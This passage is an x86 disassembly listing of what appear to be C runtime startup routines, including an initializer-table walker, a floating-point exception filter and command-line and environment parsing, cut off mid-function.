  4048af:	c7 05 20 dd 45 00 01 	movl   $0x1,0x45dd20
  4048b6:	00 00 00 
  4048b9:	e8 92 29 00 00       	call   0x407250
  4048be:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4048c2:	74 07                	je     0x4048cb
  4048c4:	e8 37 00 00 00       	call   0x404900
  4048c9:	eb 14                	jmp    0x4048df
  4048cb:	c7 05 1c dd 45 00 01 	movl   $0x1,0x45dd1c
  4048d2:	00 00 00 
  4048d5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4048d8:	51                   	push   %ecx
  4048d9:	ff 15 2c f0 40 00    	call   *0x40f02c
  4048df:	8b e5                	mov    %ebp,%esp
  4048e1:	5d                   	pop    %ebp
  4048e2:	c3                   	ret
  4048e3:	cc                   	int3
  4048e4:	cc                   	int3
  4048e5:	cc                   	int3
  4048e6:	cc                   	int3
  4048e7:	cc                   	int3
  4048e8:	cc                   	int3
  4048e9:	cc                   	int3
  4048ea:	cc                   	int3
  4048eb:	cc                   	int3
  4048ec:	cc                   	int3
  4048ed:	cc                   	int3
  4048ee:	cc                   	int3
  4048ef:	cc                   	int3
  4048f0:	55                   	push   %ebp
  4048f1:	8b ec                	mov    %esp,%ebp
  4048f3:	6a 0d                	push   $0xd
  4048f5:	e8 76 eb ff ff       	call   0x403470
  4048fa:	83 c4 04             	add    $0x4,%esp
  4048fd:	5d                   	pop    %ebp
  4048fe:	c3                   	ret
  4048ff:	cc                   	int3
  404900:	55                   	push   %ebp
  404901:	8b ec                	mov    %esp,%ebp
  404903:	6a 0d                	push   $0xd
  404905:	e8 06 ec ff ff       	call   0x403510
  40490a:	83 c4 04             	add    $0x4,%esp
  40490d:	5d                   	pop    %ebp
  40490e:	c3                   	ret
  40490f:	cc                   	int3
  404910:	55                   	push   %ebp
  404911:	8b ec                	mov    %esp,%ebp
  404913:	8b 45 08             	mov    0x8(%ebp),%eax
  404916:	3b 45 0c             	cmp    0xc(%ebp),%eax
  404919:	73 18                	jae    0x404933
  40491b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40491e:	83 39 00             	cmpl   $0x0,(%ecx)
  404921:	74 05                	je     0x404928
  404923:	8b 55 08             	mov    0x8(%ebp),%edx
  404926:	ff 12                	call   *(%edx)
  404928:	8b 45 08             	mov    0x8(%ebp),%eax
  40492b:	83 c0 04             	add    $0x4,%eax
  40492e:	89 45 08             	mov    %eax,0x8(%ebp)
  404931:	eb e0                	jmp    0x404913
  404933:	5d                   	pop    %ebp
  404934:	c3                   	ret
  404935:	cc                   	int3
  404936:	cc                   	int3
  404937:	cc                   	int3
  404938:	cc                   	int3
  404939:	cc                   	int3
  40493a:	cc                   	int3
  40493b:	cc                   	int3
  40493c:	cc                   	int3
  40493d:	cc                   	int3
  40493e:	cc                   	int3
  40493f:	cc                   	int3
  404940:	55                   	push   %ebp
  404941:	8b ec                	mov    %esp,%ebp
  404943:	83 ec 18             	sub    $0x18,%esp
  404946:	e8 d5 fb ff ff       	call   0x404520
  40494b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40494e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404951:	8b 48 50             	mov    0x50(%eax),%ecx
  404954:	51                   	push   %ecx
  404955:	8b 55 08             	mov    0x8(%ebp),%edx
  404958:	52                   	push   %edx
  404959:	e8 a2 01 00 00       	call   0x404b00
  40495e:	83 c4 08             	add    $0x8,%esp
  404961:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404964:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  404968:	74 09                	je     0x404973
  40496a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40496d:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  404971:	75 0f                	jne    0x404982
  404973:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404976:	51                   	push   %ecx
  404977:	ff 15 68 f0 40 00    	call   *0x40f068
  40497d:	e9 78 01 00 00       	jmp    0x404afa
  404982:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404985:	83 7a 08 05          	cmpl   $0x5,0x8(%edx)
  404989:	75 14                	jne    0x40499f
  40498b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40498e:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  404995:	b8 01 00 00 00       	mov    $0x1,%eax
  40499a:	e9 5b 01 00 00       	jmp    0x404afa
  40499f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4049a2:	83 79 08 01          	cmpl   $0x1,0x8(%ecx)
  4049a6:	75 08                	jne    0x4049b0
  4049a8:	83 c8 ff             	or     $0xffffffff,%eax
  4049ab:	e9 4a 01 00 00       	jmp    0x404afa
  4049b0:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4049b3:	8b 42 08             	mov    0x8(%edx),%eax
  4049b6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4049b9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4049bc:	8b 51 54             	mov    0x54(%ecx),%edx
  4049bf:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4049c2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4049c5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4049c8:	89 48 54             	mov    %ecx,0x54(%eax)
  4049cb:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4049ce:	83 7a 04 08          	cmpl   $0x8,0x4(%edx)
  4049d2:	0f 85 ff 00 00 00    	jne    0x404ad7
  4049d8:	a1 c0 b0 45 00       	mov    0x45b0c0,%eax
  4049dd:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4049e0:	eb 09                	jmp    0x4049eb
  4049e2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4049e5:	83 c1 01             	add    $0x1,%ecx
  4049e8:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4049eb:	8b 15 c0 b0 45 00    	mov    0x45b0c0,%edx
  4049f1:	03 15 c4 b0 45 00    	add    0x45b0c4,%edx
  4049f7:	39 55 ec             	cmp    %edx,-0x14(%ebp)
  4049fa:	7d 16                	jge    0x404a12
  4049fc:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4049ff:	6b c0 0c             	imul   $0xc,%eax,%eax
  404a02:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404a05:	8b 51 50             	mov    0x50(%ecx),%edx
  404a08:	c7 44 02 08 00 00 00 	movl   $0x0,0x8(%edx,%eax,1)
  404a0f:	00 
  404a10:	eb d0                	jmp    0x4049e2
  404a12:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404a15:	8b 48 58             	mov    0x58(%eax),%ecx
  404a18:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404a1b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404a1e:	81 3a 8e 00 00 c0    	cmpl   $0xc000008e,(%edx)
  404a24:	75 0f                	jne    0x404a35
  404a26:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404a29:	c7 40 58 83 00 00 00 	movl   $0x83,0x58(%eax)
  404a30:	e9 88 00 00 00       	jmp    0x404abd
  404a35:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404a38:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%ecx)
  404a3e:	75 0c                	jne    0x404a4c
  404a40:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404a43:	c7 42 58 81 00 00 00 	movl   $0x81,0x58(%edx)
  404a4a:	eb 71                	jmp    0x404abd
  404a4c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a4f:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%eax)
  404a55:	75 0c                	jne    0x404a63
  404a57:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404a5a:	c7 41 58 84 00 00 00 	movl   $0x84,0x58(%ecx)
  404a61:	eb 5a                	jmp    0x404abd
  404a63:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404a66:	81 3a 93 00 00 c0    	cmpl   $0xc0000093,(%edx)
  404a6c:	75 0c                	jne    0x404a7a
  404a6e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404a71:	c7 40 58 85 00 00 00 	movl   $0x85,0x58(%eax)
  404a78:	eb 43                	jmp    0x404abd
  404a7a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404a7d:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%ecx)
  404a83:	75 0c                	jne    0x404a91
  404a85:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404a88:	c7 42 58 82 00 00 00 	movl   $0x82,0x58(%edx)
  404a8f:	eb 2c                	jmp    0x404abd
  404a91:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a94:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%eax)
  404a9a:	75 0c                	jne    0x404aa8
  404a9c:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404a9f:	c7 41 58 86 00 00 00 	movl   $0x86,0x58(%ecx)
  404aa6:	eb 15                	jmp    0x404abd
  404aa8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404aab:	81 3a 92 00 00 c0    	cmpl   $0xc0000092,(%edx)
  404ab1:	75 0a                	jne    0x404abd
  404ab3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404ab6:	c7 40 58 8a 00 00 00 	movl   $0x8a,0x58(%eax)
  404abd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404ac0:	8b 51 58             	mov    0x58(%ecx),%edx
  404ac3:	52                   	push   %edx
  404ac4:	6a 08                	push   $0x8
  404ac6:	ff 55 fc             	call   *-0x4(%ebp)
  404ac9:	83 c4 08             	add    $0x8,%esp
  404acc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404acf:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404ad2:	89 48 58             	mov    %ecx,0x58(%eax)
  404ad5:	eb 17                	jmp    0x404aee
  404ad7:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404ada:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  404ae1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404ae4:	8b 48 04             	mov    0x4(%eax),%ecx
  404ae7:	51                   	push   %ecx
  404ae8:	ff 55 fc             	call   *-0x4(%ebp)
  404aeb:	83 c4 04             	add    $0x4,%esp
  404aee:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404af1:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404af4:	89 42 54             	mov    %eax,0x54(%edx)
  404af7:	83 c8 ff             	or     $0xffffffff,%eax
  404afa:	8b e5                	mov    %ebp,%esp
  404afc:	5d                   	pop    %ebp
  404afd:	c3                   	ret
  404afe:	cc                   	int3
  404aff:	cc                   	int3
  404b00:	55                   	push   %ebp
  404b01:	8b ec                	mov    %esp,%ebp
  404b03:	51                   	push   %ecx
  404b04:	8b 45 0c             	mov    0xc(%ebp),%eax
  404b07:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404b0a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404b0d:	8b 11                	mov    (%ecx),%edx
  404b0f:	3b 55 08             	cmp    0x8(%ebp),%edx
  404b12:	74 1e                	je     0x404b32
  404b14:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404b17:	83 c0 0c             	add    $0xc,%eax
  404b1a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404b1d:	8b 0d cc b0 45 00    	mov    0x45b0cc,%ecx
  404b23:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  404b26:	8b 55 0c             	mov    0xc(%ebp),%edx
  404b29:	03 d1                	add    %ecx,%edx
  404b2b:	39 55 fc             	cmp    %edx,-0x4(%ebp)
  404b2e:	73 02                	jae    0x404b32
  404b30:	eb d8                	jmp    0x404b0a
  404b32:	a1 cc b0 45 00       	mov    0x45b0cc,%eax
  404b37:	6b c0 0c             	imul   $0xc,%eax,%eax
  404b3a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404b3d:	03 c8                	add    %eax,%ecx
  404b3f:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  404b42:	73 0a                	jae    0x404b4e
  404b44:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404b47:	8b 02                	mov    (%edx),%eax
  404b49:	3b 45 08             	cmp    0x8(%ebp),%eax
  404b4c:	74 04                	je     0x404b52
  404b4e:	33 c0                	xor    %eax,%eax
  404b50:	eb 03                	jmp    0x404b55
  404b52:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404b55:	8b e5                	mov    %ebp,%esp
  404b57:	5d                   	pop    %ebp
  404b58:	c3                   	ret
  404b59:	cc                   	int3
  404b5a:	cc                   	int3
  404b5b:	cc                   	int3
  404b5c:	cc                   	int3
  404b5d:	cc                   	int3
  404b5e:	cc                   	int3
  404b5f:	cc                   	int3
  404b60:	55                   	push   %ebp
  404b61:	8b ec                	mov    %esp,%ebp
  404b63:	51                   	push   %ecx
  404b64:	83 3d 68 f3 45 00 00 	cmpl   $0x0,0x45f368
  404b6b:	75 05                	jne    0x404b72
  404b6d:	e8 2e 5d 00 00       	call   0x40a8a0
  404b72:	a1 78 f3 45 00       	mov    0x45f378,%eax
  404b77:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404b7a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404b7d:	33 d2                	xor    %edx,%edx
  404b7f:	8a 11                	mov    (%ecx),%dl
  404b81:	83 fa 22             	cmp    $0x22,%edx
  404b84:	75 56                	jne    0x404bdc
  404b86:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404b89:	83 c0 01             	add    $0x1,%eax
  404b8c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404b8f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404b92:	33 d2                	xor    %edx,%edx
  404b94:	8a 11                	mov    (%ecx),%dl
  404b96:	83 fa 22             	cmp    $0x22,%edx
  404b99:	74 2a                	je     0x404bc5
  404b9b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404b9e:	33 c9                	xor    %ecx,%ecx
  404ba0:	8a 08                	mov    (%eax),%cl
  404ba2:	85 c9                	test   %ecx,%ecx
  404ba4:	74 1f                	je     0x404bc5
  404ba6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404ba9:	33 c0                	xor    %eax,%eax
  404bab:	8a 02                	mov    (%edx),%al
  404bad:	50                   	push   %eax
  404bae:	e8 9d 54 00 00       	call   0x40a050
  404bb3:	83 c4 04             	add    $0x4,%esp
  404bb6:	85 c0                	test   %eax,%eax
  404bb8:	74 09                	je     0x404bc3
  404bba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404bbd:	83 c1 01             	add    $0x1,%ecx
  404bc0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404bc3:	eb c1                	jmp    0x404b86
  404bc5:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404bc8:	33 c0                	xor    %eax,%eax
  404bca:	8a 02                	mov    (%edx),%al
  404bcc:	83 f8 22             	cmp    $0x22,%eax
  404bcf:	75 09                	jne    0x404bda
  404bd1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404bd4:	83 c1 01             	add    $0x1,%ecx
  404bd7:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404bda:	eb 17                	jmp    0x404bf3
  404bdc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404bdf:	33 c0                	xor    %eax,%eax
  404be1:	8a 02                	mov    (%edx),%al
  404be3:	83 f8 20             	cmp    $0x20,%eax
  404be6:	7e 0b                	jle    0x404bf3
  404be8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404beb:	83 c1 01             	add    $0x1,%ecx
  404bee:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404bf1:	eb e9                	jmp    0x404bdc
  404bf3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404bf6:	33 c0                	xor    %eax,%eax
  404bf8:	8a 02                	mov    (%edx),%al
  404bfa:	85 c0                	test   %eax,%eax
  404bfc:	74 17                	je     0x404c15
  404bfe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404c01:	33 d2                	xor    %edx,%edx
  404c03:	8a 11                	mov    (%ecx),%dl
  404c05:	83 fa 20             	cmp    $0x20,%edx
  404c08:	7f 0b                	jg     0x404c15
  404c0a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c0d:	83 c0 01             	add    $0x1,%eax
  404c10:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404c13:	eb de                	jmp    0x404bf3
  404c15:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c18:	8b e5                	mov    %ebp,%esp
  404c1a:	5d                   	pop    %ebp
  404c1b:	c3                   	ret
  404c1c:	cc                   	int3
  404c1d:	cc                   	int3
  404c1e:	cc                   	int3
  404c1f:	cc                   	int3
  404c20:	55                   	push   %ebp
  404c21:	8b ec                	mov    %esp,%ebp
  404c23:	83 ec 10             	sub    $0x10,%esp
  404c26:	83 3d 68 f3 45 00 00 	cmpl   $0x0,0x45f368
  404c2d:	75 05                	jne    0x404c34
  404c2f:	e8 6c 5c 00 00       	call   0x40a8a0
  404c34:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  404c3b:	a1 68 dc 45 00       	mov    0x45dc68,%eax
  404c40:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404c43:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404c46:	0f be 11             	movsbl (%ecx),%edx
  404c49:	85 d2                	test   %edx,%edx
  404c4b:	74 2c                	je     0x404c79
  404c4d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c50:	0f be 08             	movsbl (%eax),%ecx
  404c53:	83 f9 3d             	cmp    $0x3d,%ecx
  404c56:	74 09                	je     0x404c61
  404c58:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404c5b:	83 c2 01             	add    $0x1,%edx
  404c5e:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404c61:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c64:	50                   	push   %eax
  404c65:	e8 56 5d 00 00       	call   0x40a9c0
  404c6a:	83 c4 04             	add    $0x4,%esp
  404c6d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404c70:	8d 54 01 01          	lea    0x1(%ecx,%eax,1),%edx
  404c74:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404c77:	eb ca                	jmp    0x404c43
  404c79:	6a 6d                	push   $0x6d
  404c7b:	68 10 f2 40 00       	push   $0x40f210
  404c80:	6a 02                	push   $0x2
  404c82:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404c85:	8d 0c 85 04 00 00 00 	lea    0x4(,%eax,4),%ecx
  404c8c:	51                   	push   %ecx
  404c8d:	e8 4e 11 00 00       	call   0x405de0
  404c92:	83 c4 10             	add    $0x10,%esp
  404c95:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404c98:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404c9b:	89 15 fc dc 45 00    	mov    %edx,0x45dcfc
  404ca1:	83 3d fc dc 45 00 00 	cmpl   $0x0,0x45dcfc
  404ca8:	75 0a                	jne    0x404cb4
  404caa:	6a 09                	push   $0x9
  404cac:	e8 1f e7 ff ff       	call   0x4033d0
  404cb1:	83 c4 04             	add    $0x4,%esp
  404cb4:	a1 68 dc 45 00       	mov    0x45dc68,%eax
  404cb9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404cbc:	eb 09                	jmp    0x404cc7
  404cbe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404cc1:	03 4d f0             	add    -0x10(%ebp),%ecx
  404cc4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404cc7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404cca:	0f be 02             	movsbl (%edx),%eax
  404ccd:	85 c0                	test   %eax,%eax
  404ccf:	74 66                	je     0x404d37
  404cd1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404cd4:	51                   	push   %ecx
  404cd5:	e8 e6 5c 00 00       	call   0x40a9c0
  404cda:	83 c4 04             	add    $0x4,%esp
  404cdd:	83 c0 01             	add    $0x1,%eax
  404ce0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404ce3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404ce6:	0f be 02             	movsbl (%edx),%eax
  404ce9:	83 f8 3d             	cmp    $0x3d,%eax
  404cec:	74 47                	je     0x404d35
  404cee:	6a 79                	push   $0x79
  404cf0:	68 10 f2 40 00       	push   $0x40f210
  404cf5:	6a 02                	push   $0x2
  404cf7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cfa:	51                   	push   %ecx
  404cfb:	e8 e0 10 00 00       	call   0x405de0
  404d00:	83 c4 10             	add    $0x10,%esp
  404d03:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404d06:	89 02                	mov    %eax,(%edx)
  404d08:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d0b:	83 38 00             	cmpl   $0x0,(%eax)
  404d0e:	75 0a                	jne    0x404d1a
  404d10:	6a 09                	push   $0x9
  404d12:	e8 b9 e6 ff ff       	call   0x4033d0
  404d17:	83 c4 04             	add    $0x4,%esp
  404d1a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404d1d:	51                   	push   %ecx
  404d1e:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404d21:	8b 02                	mov    (%edx),%eax
  404d23:	50                   	push   %eax
  404d24:	e8 a7 5b 00 00       	call   0x40a8d0
  404d29:	83 c4 08             	add    $0x8,%esp
  404d2c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404d2f:	83 c1 04             	add    $0x4,%ecx
  404d32:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404d35:	eb 87                	jmp    0x404cbe
  404d37:	6a 02                	push   $0x2
  404d39:	8b 15 68 dc 45 00    	mov    0x45dc68,%edx
  404d3f:	52                   	push   %edx
  404d40:	e8 eb 14 00 00       	call   0x406230
  404d45:	83 c4 08             	add    $0x8,%esp
  404d48:	c7 05 68 dc 45 00 00 	movl   $0x0,0x45dc68
  404d4f:	00 00 00 
  404d52:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d55:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  404d5b:	c7 05 64 f3 45 00 01 	movl   $0x1,0x45f364
  404d62:	00 00 00 
  404d65:	8b e5                	mov    %ebp,%esp
  404d67:	5d                   	pop    %ebp
  404d68:	c3                   	ret
  404d69:	cc                   	int3
  404d6a:	cc                   	int3
  404d6b:	cc                   	int3
  404d6c:	cc                   	int3
  404d6d:	cc                   	int3
  404d6e:	cc                   	int3
  404d6f:	cc                   	int3
  404d70:	55                   	push   %ebp
  404d71:	8b ec                	mov    %esp,%ebp
  404d73:	83 ec 14             	sub    $0x14,%esp
  404d76:	83 3d 68 f3 45 00 00 	cmpl   $0x0,0x45f368
  404d7d:	75 05                	jne    0x404d84
  404d7f:	e8 1c 5b 00 00       	call   0x40a8a0
  404d84:	68 04 01 00 00       	push   $0x104
  404d89:	68 24 dd 45 00       	push   $0x45dd24
  404d8e:	6a 00                	push   $0x0
  404d90:	ff 15 6c f0 40 00    	call   *0x40f06c
  404d96:	c7 05 0c dd 45 00 24 	movl   $0x45dd24,0x45dd0c
  404d9d:	dd 45 00 
  404da0:	a1 78 f3 45 00       	mov    0x45f378,%eax
  404da5:	0f be 08             	movsbl (%eax),%ecx
  404da8:	85 c9                	test   %ecx,%ecx
  404daa:	75 0b                	jne    0x404db7
  404dac:	8b 15 0c dd 45 00    	mov    0x45dd0c,%edx
  404db2:	89 55 ec             	mov    %edx,-0x14(%ebp)
  404db5:	eb 08                	jmp    0x404dbf
  404db7:	a1 78 f3 45 00       	mov    0x45f378,%eax
  404dbc:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404dbf:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404dc2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404dc5:	8d 55 fc             	lea    -0x4(%ebp),%edx
  404dc8:	52                   	push   %edx
  404dc9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404dcc:	50                   	push   %eax
  404dcd:	6a 00                	push   $0x0
  404dcf:	6a 00                	push   $0x0
  404dd1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404dd4:	51                   	push   %ecx
  404dd5:	e8 76 00 00 00       	call   0x404e50
  404dda:	83 c4 14             	add    $0x14,%esp
  404ddd:	68 80 00 00 00       	push   $0x80
  404de2:	68 1c f2 40 00       	push   $0x40f21c
  404de7:	6a 02                	push   $0x2
  404de9:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404dec:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404def:	8d 0c 90             	lea    (%eax,%edx,4),%ecx
  404df2:	51                   	push   %ecx
  404df3:	e8 e8 0f 00 00       	call   0x405de0
  404df8:	83 c4 10             	add    $0x10,%esp
  404dfb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404dfe:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404e02:	75 0a                	jne    0x404e0e
  404e04:	6a 08                	push   $0x8
  404e06:	e8 c5 e5 ff ff       	call   0x4033d0
  404e0b:	83 c4 04             	add    $0x4,%esp
  404e0e:	8d 55 fc             	lea    -0x4(%ebp),%edx
  404e11:	52                   	push   %edx
  404e12:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404e15:	50                   	push   %eax
  404e16:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404e19:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404e1c:	8d 04 8a             	lea    (%edx,%ecx,4),%eax
  404e1f:	50                   	push   %eax
  404e20:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404e23:	51                   	push   %ecx
  404e24:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404e27:	52                   	push   %edx
  404e28:	e8 23 00 00 00       	call   0x404e50
  404e2d:	83 c4 14             	add    $0x14,%esp
  404e30:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404e33:	83 e8 01             	sub    $0x1,%eax
  404e36:	a3 f0 dc 45 00       	mov    %eax,0x45dcf0
  404e3b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404e3e:	89 0d f4 dc 45 00    	mov    %ecx,0x45dcf4
  404e44:	8b e5                	mov    %ebp,%esp
  404e46:	5d                   	pop    %ebp
  404e47:	c3                   	ret
  404e48:	cc                   	int3
  404e49:	cc                   	int3
  404e4a:	cc                   	int3
  404e4b:	cc                   	int3
  404e4c:	cc                   	int3
  404e4d:	cc                   	int3
  404e4e:	cc                   	int3
  404e4f:	cc                   	int3
  404e50:	55                   	push   %ebp
  404e51:	8b ec                	mov    %esp,%ebp
  404e53:	83 ec 14             	sub    $0x14,%esp
  404e56:	8b 45 18             	mov    0x18(%ebp),%eax
  404e59:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  404e5f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404e62:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
  404e68:	8b 55 08             	mov    0x8(%ebp),%edx
  404e6b:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404e6e:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404e72:	74 11                	je     0x404e85
  404e74:	8b 45 0c             	mov    0xc(%ebp),%eax
  404e77:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404e7a:	89 08                	mov    %ecx,(%eax)
  404e7c:	8b 55 0c             	mov    0xc(%ebp),%edx
  404e7f:	83 c2 04             	add    $0x4,%edx
  404e82:	89 55 0c             	mov    %edx,0xc(%ebp)
  404e85:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404e88:	0f be 08             	movsbl (%eax),%ecx
  404e8b:	83 f9 22             	cmp    $0x22,%ecx
  404e8e:	0f 85 c9 00 00 00    	jne    0x404f5d
  404e94:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404e97:	83 c2 01             	add    $0x1,%edx
  404e9a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404e9d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404ea0:	0f be 08             	movsbl (%eax),%ecx
  404ea3:	83 f9 22             	cmp    $0x22,%ecx
  404ea6:	74 7a                	je     0x404f22
  404ea8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404eab:	0f be 02             	movsbl (%edx),%eax
  404eae:	85 c0                	test   %eax,%eax
  404eb0:	74 70                	je     0x404f22
  404eb2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404eb5:	33 d2                	xor    %edx,%edx
  404eb7:	8a 11                	mov    (%ecx),%dl
  404eb9:	33 c0                	xor    %eax,%eax
  404ebb:	8a 82 21 f1 45 00    	mov    0x45f121(%edx),%al
  404ec1:	83 e0 04             	and    $0x4,%eax
  404ec4:	85 c0                	test   %eax,%eax
  404ec6:	74 2f                	je     0x404ef7
  404ec8:	8b 4d 18             	mov    0x18(%ebp),%ecx
  404ecb:	8b 11                	mov    (%ecx),%edx
  404ecd:	83 c2 01             	add    $0x1,%edx
  404ed0:	8b 45 18             	mov    0x18(%ebp),%eax
  404ed3:	89 10                	mov    %edx,(%eax)
  404ed5:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404ed9:	74 1c                	je     0x404ef7
  404edb:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404ede:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404ee1:	8a 02                	mov    (%edx),%al
  404ee3:	88 01                	mov    %al,(%ecx)
  404ee5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404ee8:	83 c1 01             	add    $0x1,%ecx
  404eeb:	89 4d 10             	mov    %ecx,0x10(%ebp)
  404eee:	8b 55 fc             	mov    -0x4(%ebp),%edx
